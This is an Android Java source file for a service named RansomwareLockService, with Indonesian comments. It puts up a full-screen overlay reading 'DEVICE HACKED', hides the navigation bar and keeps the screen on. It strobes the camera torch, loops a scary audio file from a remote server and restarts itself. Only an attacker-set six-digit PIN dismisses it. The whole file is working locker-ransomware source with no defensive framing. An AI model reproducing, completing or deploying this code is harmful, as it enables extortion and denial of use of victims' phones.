package com.nullx.sta;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.ImageView;      // <-- TAMBAHKAN INI
import android.widget.TextView;
import android.widget.Toast;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class RansomwareLockService extends Service {
    private WindowManager wm;
    private View overlayView;
    private String password;
    private Timer flashTimer;
    private boolean isFlashOn = false;
    private MediaPlayer mediaPlayer;
    private Handler handler = new Handler();

    private View[] pinDots = new View[6];
    private StringBuilder enteredPin = new StringBuilder();

    @Override
    public void onCreate() {
        super.onCreate();
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String name = intent.getStringExtra("name");
        password = intent.getStringExtra("password");
        String flashMode = intent.getStringExtra("flash");
        String musicUrl = intent.getStringExtra("music");
        String wallpaperUrl = intent.getStringExtra("wallpaper");

        showLockScreen(name, wallpaperUrl);

        new Thread(() -> {
            playMusic(musicUrl);
            if ("kelap".equals(flashMode)) {
                try { Thread.sleep(500); } catch (Exception ignored) {}
                startFlashing();
            }
        }).start();

        return START_STICKY;
    }

    private void showLockScreen(String name, String wallpaperUrl) {
        LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
        overlayView = inflater.inflate(R.layout.lock_screen_ransom, null);

        // ====== WALLPAPER ======
        if (wallpaperUrl != null && !wallpaperUrl.isEmpty()) {
            new Thread(() -> {
                try {
                    URL url = new URL(wallpaperUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoInput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);
                    conn.connect();
                    InputStream input = conn.getInputStream();
                    Bitmap bitmap = BitmapFactory.decodeStream(input);
                    input.close();
                    conn.disconnect();
                    if (bitmap != null) {
                        handler.post(() -> {
                            ImageView bg = overlayView.findViewById(R.id.lockWallpaper);
                            if (bg != null) bg.setImageBitmap(bitmap);
                        });
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        }

        // ====== JUDUL ======
        TextView tvMessage = overlayView.findViewById(R.id.lockMessage);
        if (tvMessage != null) {
            String displayName = (name != null && !name.isEmpty()) ? name : "DEVICE HACKED";
            tvMessage.setText("⚠️ " + displayName + " ⚠️");
        }

        TextView tvSubtitle = overlayView.findViewById(R.id.lockSubtitle);
        if (tvSubtitle != null) {
            tvSubtitle.setText("🔐 ENTER UNLOCK PIN");
        }

        // ====== PIN DOTS ======
        pinDots[0] = overlayView.findViewById(R.id.dot1);
        pinDots[1] = overlayView.findViewById(R.id.dot2);
        pinDots[2] = overlayView.findViewById(R.id.dot3);
        pinDots[3] = overlayView.findViewById(R.id.dot4);
        pinDots[4] = overlayView.findViewById(R.id.dot5);
        pinDots[5] = overlayView.findViewById(R.id.dot6);

        // ====== KEYPAD ======
        int[] keyIds = {
                R.id.key1, R.id.key2, R.id.key3,
                R.id.key4, R.id.key5, R.id.key6,
                R.id.key7, R.id.key8, R.id.key9,
                R.id.key0
        };
        String[] keyLabels = {"1","2","3","4","5","6","7","8","9","0"};

        for (int i = 0; i < keyIds.length; i++) {
            Button btn = overlayView.findViewById(keyIds[i]);
            String label = keyLabels[i];
            btn.setOnClickListener(v -> {
                if (enteredPin.length() < 6) {
                    enteredPin.append(label);
                    updatePinDots();
                }
            });
        }

        Button deleteBtn = overlayView.findViewById(R.id.keyDelete);
        deleteBtn.setOnClickListener(v -> {
            if (enteredPin.length() > 0) {
                enteredPin.deleteCharAt(enteredPin.length() - 1);
                updatePinDots();
            }
        });

        Button enterBtn = overlayView.findViewById(R.id.keyEnter);
        enterBtn.setOnClickListener(v -> {
            String input = enteredPin.toString();
            if (input.isEmpty()) {
                Toast.makeText(this, "Masukkan PIN!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (input.equals(password)) {
                unlockDevice();
            } else {
                Toast.makeText(this, "❌ PIN Salah!", Toast.LENGTH_SHORT).show();
                enteredPin.setLength(0);
                updatePinDots();
            }
        });

        // ====== FULLSCREEN OVERLAY ======
        int flags = WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            flags |= WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                        WindowManager.LayoutParams.TYPE_PHONE,
                flags,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.CENTER;

        wm.addView(overlayView, params);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            overlayView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }
    }

    private void updatePinDots() {
        for (int i = 0; i < pinDots.length; i++) {
            if (i < enteredPin.length()) {
                pinDots[i].setBackgroundResource(R.drawable.pin_dot_filled);
            } else {
                pinDots[i].setBackgroundResource(R.drawable.pin_dot_empty);
            }
        }
    }

    private void unlockDevice() {
        stopFlashing();
        stopMusic();
        if (overlayView != null && wm != null) {
            wm.removeView(overlayView);
            overlayView = null;
        }
        stopSelf();
    }

    private void startFlashing() {
        flashTimer = new Timer();
        flashTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                isFlashOn = !isFlashOn;
                CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
                try {
                    cm.setTorchMode("0", isFlashOn);
                } catch (Exception e) { /* ignore */ }
            }
        }, 0, 300);
    }

    private void stopFlashing() {
        if (flashTimer != null) {
            flashTimer.cancel();
            flashTimer = null;
        }
        CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            cm.setTorchMode("0", false);
        } catch (Exception e) { /* ignore */ }
    }

    private void playMusic(String url) {
        try {
            mediaPlayer = new MediaPlayer();
            if (url != null && !url.isEmpty()) {
                mediaPlayer.setDataSource(url);
            } else {
                mediaPlayer.setDataSource("https://satriasta.xwarcloud.my.id/scary.mp3");
            }
            mediaPlayer.setLooping(true);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(mp -> mp.start());
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                mp.release();
                mediaPlayer = null;
                return true;
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopMusic() {
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                mediaPlayer.release();
            } catch (Exception ignored) {}
            mediaPlayer = null;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopFlashing();
        stopMusic();
        if (overlayView != null && wm != null) {
            wm.removeView(overlayView);
            overlayView = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}